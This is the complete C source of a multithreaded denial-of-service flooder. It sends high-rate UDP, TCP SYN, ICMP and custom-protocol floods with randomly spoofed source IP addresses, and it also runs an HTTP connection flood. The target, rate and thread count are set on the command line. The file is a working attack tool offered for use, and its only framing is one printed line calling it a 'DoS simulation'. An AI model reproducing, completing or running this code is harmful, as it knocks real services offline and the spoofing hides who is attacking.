#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>

#define PACKET_DATA_SIZE 1024  // Data payload size (excluding headers)
#define DEFAULT_RATE 100000    // packets/sec per thread
#define DEFAULT_THREADS 4
#define IP_HDR_SIZE sizeof(struct iphdr)
#define UDP_HDR_SIZE sizeof(struct udphdr)
#define TCP_HDR_SIZE 20  // Standard TCP header without options
#define ICMP_HDR_SIZE 8  // Standard ICMP echo header
#define HTTP_REQUEST_SIZE 512  // Buffer for HTTP request

// Enum for protocols
enum Protocol {
    PROTO_UDP,
    PROTO_TCP,
    PROTO_ICMP,
    PROTO_HTTP,
    PROTO_RAW
};

// Pseudo header for UDP/TCP checksum
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t length;
};

// ICMP header struct
struct icmphdr {
    u_int8_t type;
    u_int8_t code;
    u_int16_t checksum;
    u_int16_t id;
    u_int16_t sequence;
};

// Checksum calculation function
unsigned short checksum(void* data, int length) {
    unsigned short* buf = data;
    unsigned int sum = 0;
    unsigned short result;

    while (length > 1) {
        sum += *buf++;
        length -= 2;
    }
    if (length == 1) {
        sum += *(unsigned char*)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

typedef struct {
    char* target_ip;
    int target_port;
    int rate;
    int randomize_payload;  
    int randomize_src_port; 
    enum Protocol protocol;
    int proto_num;  // For RAW
} ThreadArgs;

// HTTP flood function (no spoofing, uses regular TCP sockets)
void* http_flood(void* arg) {
    ThreadArgs* args = (ThreadArgs*)arg;
    int port = (args->target_port == 0) ? 80 : args->target_port;
    struct sockaddr_in target;
    char request[HTTP_REQUEST_SIZE];

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, args->target_ip, &target.sin_addr);

    // Build a simple HTTP GET request
    snprintf(request, sizeof(request),
             "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
             args->target_ip);

    int delay = 1000000 / args->rate;  // microseconds

    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0) {
            send(sock, request, strlen(request), 0);
        }
        close(sock);
        usleep(delay);
    }

    return NULL;
}

// Raw packet flood function (with spoofing)
void* raw_flood(void* arg) {
    ThreadArgs* args = (ThreadArgs*)arg;
    int sock;
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Setsockopt IP_HDRINCL failed");
        close(sock);
        return NULL;
    }

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(args->target_port);  // Used for UDP/TCP; ignored otherwise
    inet_pton(AF_INET, args->target_ip, &target.sin_addr);

    // Determine header sizes based on protocol
    int trans_hdr_size = 0;
    switch (args->protocol) {
        case PROTO_UDP: trans_hdr_size = UDP_HDR_SIZE; break;
        case PROTO_TCP: trans_hdr_size = TCP_HDR_SIZE; break;
        case PROTO_ICMP: trans_hdr_size = ICMP_HDR_SIZE; break;
        case PROTO_RAW: trans_hdr_size = 0; break;
        default: break;
    }
    int full_packet_size = IP_HDR_SIZE + trans_hdr_size + PACKET_DATA_SIZE;
    char packet[full_packet_size];
    struct iphdr* iph = (struct iphdr*)packet;
    void* trans_hdr = packet + IP_HDR_SIZE;
    char* data = packet + IP_HDR_SIZE + trans_hdr_size;

    // Seed random per thread
    srand(time(NULL) + (unsigned long)pthread_self());

    // Precompute fixed IP header fields
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(full_packet_size);
    iph->id = htons(rand() % 65535);  // Random ID initially
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->daddr = target.sin_addr.s_addr;

    // Set IP protocol
    switch (args->protocol) {
        case PROTO_UDP: iph->protocol = IPPROTO_UDP; break;
        case PROTO_TCP: iph->protocol = IPPROTO_TCP; break;
        case PROTO_ICMP: iph->protocol = IPPROTO_ICMP; break;
        case PROTO_RAW: iph->protocol = args->proto_num; break;
        default: break;
    }

    int delay = 1000000 / args->rate;  // microseconds
    u_int16_t icmp_seq = 0;  // For ICMP sequence

    while (1) {
        // Random source IP
        char src_ip[16];
        snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d",
                 rand() % 256, rand() % 256, rand() % 256, rand() % 256);
        iph->saddr = inet_addr(src_ip);

        // Random IP ID per packet
        iph->id = htons(rand() % 65535);

        // Protocol-specific header setup
        switch (args->protocol) {
            case PROTO_UDP: {
                struct udphdr* udph = (struct udphdr*)trans_hdr;
                udph->dest = target.sin_port;
                udph->len = htons(UDP_HDR_SIZE + PACKET_DATA_SIZE);
                if (args->randomize_src_port) {
                    udph->source = htons(rand() % 65535 + 1);
                } else {
                    udph->source = htons(12345);
                }
                break;
            }
            case PROTO_TCP: {
                struct tcphdr* tcph = (struct tcphdr*)trans_hdr;
                tcph->dest = target.sin_port;
                tcph->seq = htonl(rand());
                tcph->ack_seq = 0;
                tcph->doff = 5;  // No options
                tcph->syn = 1;   // SYN flood
                tcph->window = htons(64240);
                tcph->urg_ptr = 0;
                if (args->randomize_src_port) {
                    tcph->source = htons(rand() % 65535 + 1);
                } else {
                    tcph->source = htons(12345);
                }
                break;
            }
            case PROTO_ICMP: {
                struct icmphdr* icmph = (struct icmphdr*)trans_hdr;
                icmph->type = 8;  // Echo request
                icmph->code = 0;
                icmph->id = htons(rand() % 65535);
                icmph->sequence = htons(icmp_seq++);
                icmph->checksum = 0;  // Set later
                break;
            }
            case PROTO_RAW: {
                // No additional header
                break;
            }
            default: break;
        }

        // Randomize payload if enabled
        if (args->randomize_payload) {
            for (int i = 0; i < PACKET_DATA_SIZE; i++) {
                data[i] = rand() % 256;
            }
        } else {
            memset(data, 'A', PACKET_DATA_SIZE);
        }

        // IP checksum
        iph->check = 0;
        iph->check = checksum(iph, IP_HDR_SIZE);

        // Protocol-specific checksum
        switch (args->protocol) {
            case PROTO_UDP:
            case PROTO_TCP: {
                struct pseudo_header psh;
                psh.source_address = iph->saddr;
                psh.dest_address = iph->daddr;
                psh.placeholder = 0;
                psh.protocol = iph->protocol;
                psh.length = htons(trans_hdr_size + PACKET_DATA_SIZE);

                int pseudogram_size = sizeof(struct pseudo_header) + trans_hdr_size + PACKET_DATA_SIZE;
                char pseudogram[pseudogram_size];
                memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header), trans_hdr, trans_hdr_size + PACKET_DATA_SIZE);

                if (args->protocol == PROTO_UDP) {
                    ((struct udphdr*)trans_hdr)->check = 0;
                    ((struct udphdr*)trans_hdr)->check = checksum(pseudogram, pseudogram_size);
                } else {
                    ((struct tcphdr*)trans_hdr)->check = 0;
                    ((struct tcphdr*)trans_hdr)->check = checksum(pseudogram, pseudogram_size);
                }
                break;
            }
            case PROTO_ICMP: {
                struct icmphdr* icmph = (struct icmphdr*)trans_hdr;
                icmph->checksum = 0;
                icmph->checksum = checksum(trans_hdr, ICMP_HDR_SIZE + PACKET_DATA_SIZE);
                break;
            }
            case PROTO_RAW: {
                // No checksum for custom protocol
                break;
            }
            default: break;
        }

        // Send packet
        sendto(sock, packet, full_packet_size, 0, (struct sockaddr*)&target, sizeof(target));

        usleep(delay);
    }

    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target_ip> <port> [rate_per_thread] [threads] [randomize_payload 0/1] [randomize_src_port 0/1] [protocol udp/tcp/icmp/http/raw] [proto_num for raw]\n", argv[0]);
        printf("Note: This program requires root privileges for raw sockets. For HTTP, no IP spoofing (uses regular TCP). Port ignored for ICMP/raw, default 80 for HTTP.\n");
        printf("TCP mode uses SYN flood. RAW requires proto_num (e.g., 255 for test).\n");
        return 1;
    }

    char* ip = argv[1];
    int port = atoi(argv[2]);
    int rate = argc >= 4 ? atoi(argv[3]) : DEFAULT_RATE;
    int threads = argc >= 5 ? atoi(argv[4]) : DEFAULT_THREADS;
    int randomize_payload = argc >= 6 ? atoi(argv[5]) : 1;  
    int randomize_src_port = argc >= 7 ? atoi(argv[6]) : 1;  
    char* proto_str = argc >= 8 ? argv[7] : "udp";
    int proto_num = argc >= 9 ? atoi(argv[8]) : 0;

    enum Protocol protocol;
    if (strcasecmp(proto_str, "udp") == 0) protocol = PROTO_UDP;
    else if (strcasecmp(proto_str, "tcp") == 0) protocol = PROTO_TCP;
    else if (strcasecmp(proto_str, "icmp") == 0) protocol = PROTO_ICMP;
    else if (strcasecmp(proto_str, "http") == 0) protocol = PROTO_HTTP;
    else if (strcasecmp(proto_str, "raw") == 0) {
        protocol = PROTO_RAW;
        if (proto_num == 0) {
            printf("Error: proto_num required for raw protocol.\n");
            return 1;
        }
    } else {
        printf("Error: Invalid protocol. Supported: udp, tcp, icmp, http, raw\n");
        return 1;
    }

    // Adjust port for HTTP/ICMP/RAW
    if (protocol == PROTO_HTTP && port == 0) port = 80;
    if (protocol == PROTO_ICMP || protocol == PROTO_RAW) port = 0;

    printf("Launching enhanced flood on %s:%d — Protocol: %s, Rate: %d pps/thread, Threads: %d, Random Payload: %d, Random Src Port: %d\n",
           ip, port, proto_str, rate, threads, randomize_payload, randomize_src_port);
    if (protocol == PROTO_RAW) printf("Raw Protocol Number: %d\n", proto_num);
    printf("Features: IP spoofing (except HTTP), multi-protocol support for DoS simulation.\n");

    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        ThreadArgs* args = malloc(sizeof(ThreadArgs));
        args->target_ip = ip;
        args->target_port = port;
        args->rate = rate;
        args->randomize_payload = randomize_payload;
        args->randomize_src_port = randomize_src_port;
        args->protocol = protocol;
        args->proto_num = proto_num;
        pthread_create(&tid[i], NULL, (protocol == PROTO_HTTP ? http_flood : raw_flood), (void*)args);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    return 0;
}